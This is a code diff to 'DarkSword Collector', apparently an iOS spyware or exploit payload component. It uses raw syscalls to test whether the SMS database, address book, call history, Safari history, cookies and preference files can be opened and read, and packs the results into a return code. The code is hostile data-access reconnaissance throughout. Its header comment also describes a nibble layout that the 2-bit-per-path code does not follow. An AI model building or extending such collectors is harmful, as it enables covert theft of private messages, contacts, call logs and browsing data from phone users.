@@ -1,9 +1,18 @@
 /**
- * DarkSword Collector v18 - Multi-file diagnostic
- * bits 0-7: /etc/hosts first byte (control: should be 0x23 '#')
- * bits 8-15: SMS.db first byte
- * bits 16-23: .GlobalPreferences.plist first byte
- * bits 24-31: /etc/fstab first byte
+ * DarkSword Collector v19 - Comprehensive path scan
+ * Tests 8 file paths, encodes status in 32-bit return
+ * Each nibble (4 bits): bit3=open_ok, bit2=read_ok, bit1-0=reserved
+ * Byte 0: paths 0-1, Byte 1: paths 2-3, Byte 2: paths 4-5, Byte 3: paths 6-7
+ *
+ * Paths:
+ *  0: /etc/hosts (control)
+ *  1: /var/mobile/Library/Preferences/.GlobalPreferences.plist
+ *  2: /var/mobile/Library/SMS/sms.db
+ *  3: /var/mobile/Library/AddressBook/AddressBook.sqlitedb
+ *  4: /var/mobile/Library/CallHistoryDB/CallHistory.storedata
+ *  5: /var/mobile/Library/Safari/History.db
+ *  6: /var/mobile/Library/Cookies/Cookies.binarycookies
+ *  7: /var/mobile/Library/Preferences/com.apple.springboard.plist
  */
 
 static long _svc1(long n, long a) {
@@ -32,20 +41,26 @@ static long _svc3(long n, long a, long b, long c) {
 #define SYS_read  3
 #define SYS_close 6
 
-static unsigned char _fb(const char *path) {
+/* Returns: bit0=open_ok, bit1=read_ok */
+static int _probe(const char *path) {
     int fd = (int)_svc2(SYS_open, (long)path, 0);
-    if (fd < 0) return 0xFF;
+    if (fd < 0) return 0;
     unsigned char b = 0;
     int n = (int)_svc3(SYS_read, fd, (long)&b, 1);
     _svc1(SYS_close, fd);
-    return (n > 0) ? b : 0xFE;
+    if (n > 0) return 3; /* open+read */
+    return 1; /* open only */
 }
 
 int ds_start(void) {
-    unsigned char hosts = _fb("/etc/hosts");
-    unsigned char sms = _fb("/var/mobile/Library/SMS/sms.db");
-    unsigned char prefs = _fb("/var/mobile/Library/Preferences/.GlobalPreferences.plist");
-    unsigned char fstab = _fb("/etc/fstab");
-
-    return (int)hosts | ((int)sms << 8) | ((int)prefs << 16) | ((int)fstab << 24);
+    int r = 0;
+    r |= (_probe("/etc/hosts") & 3);                           /* bits 0-1 */
+    r |= (_probe("/var/mobile/Library/Preferences/.GlobalPreferences.plist") & 3) << 2;  /* bits 2-3 */
+    r |= (_probe("/var/mobile/Library/SMS/sms.db") & 3) << 4;  /* bits 4-5 */
+    r |= (_probe("/var/mobile/Library/AddressBook/AddressBook.sqlitedb") & 3) << 6;       /* bits 6-7 */
+    r |= (_probe("/var/mobile/Library/CallHistoryDB/CallHistory.storedata") & 3) << 8;    /* bits 8-9 */
+    r |= (_probe("/var/mobile/Library/Safari/History.db") & 3) << 10;  /* bits 10-11 */
+    r |= (_probe("/var/mobile/Library/Cookies/Cookies.binarycookies") & 3) << 12;        /* bits 12-13 */
+    r |= (_probe("/var/mobile/Library/Preferences/com.apple.springboard.plist") & 3) << 14; /* bits 14-15 */
+    return r;
 }
